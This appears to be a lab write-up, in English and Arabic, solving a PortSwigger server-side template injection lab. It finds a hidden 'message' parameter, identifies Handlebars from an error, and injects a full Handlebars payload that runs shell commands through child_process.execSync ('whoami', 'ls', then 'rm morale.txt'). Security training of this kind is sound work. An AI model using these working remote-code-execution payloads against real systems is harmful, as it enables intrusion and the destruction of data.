## Welcome, my friend. Today we will start the [4. SSTI lab](https://portswigger.net/web-security/server-side-template-injection/exploiting/lab-server-side-template-injection-in-an-unknown-language-with-a-documented-exploit) in ```portswigger```
### Let's play this lab:

#### First, we navigate inside the browser
![image](https://github.com/user-attachments/assets/67461762-3861-4244-88c5-ee4fb9086d6d)


### اول خطوة هي اننا نتصفح الموقع ونرى ما هو مريب علشان نستغلها في اختراق ذلك التحدي.
![image](https://github.com/user-attachments/assets/07247f18-16a6-4c5c-a445-bc5eccfb2ab4)

### لم نلاحظ اي شئ مهم لغاية دلوقتي هنبدأ نبحث على param hidden من خلال burp امتداد param miner وطبعا نجربنا نفس الكلام في اول لاب واكتشفنا ذلك الparam اللي اسمه message:

![image](https://github.com/user-attachments/assets/e46daee4-f2b7-4a6e-8a60-4516189b486d)

### نبدأ نحقن كود زي ده علشان نشوف هيحصل تغير ولا لا
```
/?message=${{<%[%'"}}%\
```

![image](https://github.com/user-attachments/assets/521b8f1b-1e29-44a1-af2b-c92ec5dc9be7)



### جميل تم ظهور خطأ يشير ان المكتبة المستخدمة هي Handlebars. دلوقتي ممكن نبحث عن اكواد الحقن :
![image](https://github.com/user-attachments/assets/9bbcd51a-f8ad-4a4c-9de7-38bce1dd7864)


### هنستخدم ذلك الكود:

```
{{#with "s" as |string|}}
  {{#with "e"}}
    {{#with split as |conslist|}}
      {{this.pop}}
      {{this.push (lookup string.sub "constructor")}}
      {{this.pop}}
      {{#with string.split as |codelist|}}
        {{this.pop}}
        {{this.push "return require('child_process').execSync('ls -la');"}}
        {{this.pop}}
        {{#each conslist}}
          {{#with (string.sub.apply 0 codelist)}}
            {{this}}
          {{/with}}
        {{/each}}
      {{/with}}
    {{/with}}
  {{/with}}
{{/with}}
```
### ولكن هيتم تشفيره url encode:
![image](https://github.com/user-attachments/assets/17fffaea-6acb-4e06-8a92-e5d3bf6235bc)

![image](https://github.com/user-attachments/assets/3c1d35e9-51fd-4c45-a36b-f3515a701d45)

```
/?message={{%23with "s" as |string|}}%0A%20 {{%23with "e"}}%0A%20%20%20 {{%23with split as |conslist|}}%0A%20%20%20%20%20 {{this.pop}}%0A%20%20%20%20%20 {{this.push (lookup string.sub "constructor")}}%0A%20%20%20%20%20 {{this.pop}}%0A%20%20%20%20%20 {{%23with string.split as |codelist|}}%0A%20%20%20%20%20%20%20 {{this.pop}}%0A%20%20%20%20%20%20%20 {{this.push "return require('child_process').execSync('whoami')%3B"}}%0A%20%20%20%20%20%20%20 {{this.pop}}%0A%20%20%20%20%20%20%20 {{%23each conslist}}%0A%20%20%20%20%20%20%20%20%20 {{%23with (string.sub.apply 0 codelist)}}%0A%20%20%20%20%20%20%20%20%20%20%20 {{this}}%0A%20%20%20%20%20%20%20%20%20 {{%2Fwith}}%0A%20%20%20%20%20%20%20 {{%2Feach}}%0A%20%20%20%20%20 {{%2Fwith}}%0A%20%20%20 {{%2Fwith}}%0A%20 {{%2Fwith}}%0A{{%2Fwith}}
```

![image](https://github.com/user-attachments/assets/195df938-c405-4282-b71a-38b8f79d6604)

### ثم نستخدم ذلك الكود:

```
/?message={{%23with "s" as |string|}}%0A%20 {{%23with "e"}}%0A%20%20%20 {{%23with split as |conslist|}}%0A%20%20%20%20%20 {{this.pop}}%0A%20%20%20%20%20 {{this.push (lookup string.sub "constructor")}}%0A%20%20%20%20%20 {{this.pop}}%0A%20%20%20%20%20 {{%23with string.split as |codelist|}}%0A%20%20%20%20%20%20%20 {{this.pop}}%0A%20%20%20%20%20%20%20 {{this.push "return require('child_process').execSync('ls')%3B"}}%0A%20%20%20%20%20%20%20 {{this.pop}}%0A%20%20%20%20%20%20%20 {{%23each conslist}}%0A%20%20%20%20%20%20%20%20%20 {{%23with (string.sub.apply 0 codelist)}}%0A%20%20%20%20%20%20%20%20%20%20%20 {{this}}%0A%20%20%20%20%20%20%20%20%20 {{%2Fwith}}%0A%20%20%20%20%20%20%20 {{%2Feach}}%0A%20%20%20%20%20 {{%2Fwith}}%0A%20%20%20 {{%2Fwith}}%0A%20 {{%2Fwith}}%0A{{%2Fwith}}
```
![image](https://github.com/user-attachments/assets/efcf452d-1834-4f3f-860d-f043670463c4)



### علشان نحل ذلك التحدي لازم نحذف ملف ```morale.txt```. هنستخدم ذلك الكود:
```
/?message={{%23with "s" as |string|}}%0A%20 {{%23with "e"}}%0A%20%20%20 {{%23with split as |conslist|}}%0A%20%20%20%20%20 {{this.pop}}%0A%20%20%20%20%20 {{this.push (lookup string.sub "constructor")}}%0A%20%20%20%20%20 {{this.pop}}%0A%20%20%20%20%20 {{%23with string.split as |codelist|}}%0A%20%20%20%20%20%20%20 {{this.pop}}%0A%20%20%20%20%20%20%20 {{this.push "return require('child_process').execSync('rm morale.txt')%3B"}}%0A%20%20%20%20%20%20%20 {{this.pop}}%0A%20%20%20%20%20%20%20 {{%23each conslist}}%0A%20%20%20%20%20%20%20%20%20 {{%23with (string.sub.apply 0 codelist)}}%0A%20%20%20%20%20%20%20%20%20%20%20 {{this}}%0A%20%20%20%20%20%20%20%20%20 {{%2Fwith}}%0A%20%20%20%20%20%20%20 {{%2Feach}}%0A%20%20%20%20%20 {{%2Fwith}}%0A%20%20%20 {{%2Fwith}}%0A%20 {{%2Fwith}}%0A{{%2Fwith}}
```

![image](https://github.com/user-attachments/assets/b5203751-e69f-46c5-ac95-c25bf75a4203)

## وهنا تم حل اللاب يا صديقي ;)





-----------------

Well, We Congratulations, the lab has been solved successfully.




<p align="center">
<img src="https://github.com/user-attachments/assets/853f5e50-d1fd-4465-9c5a-a3f27700e936" >
</p>
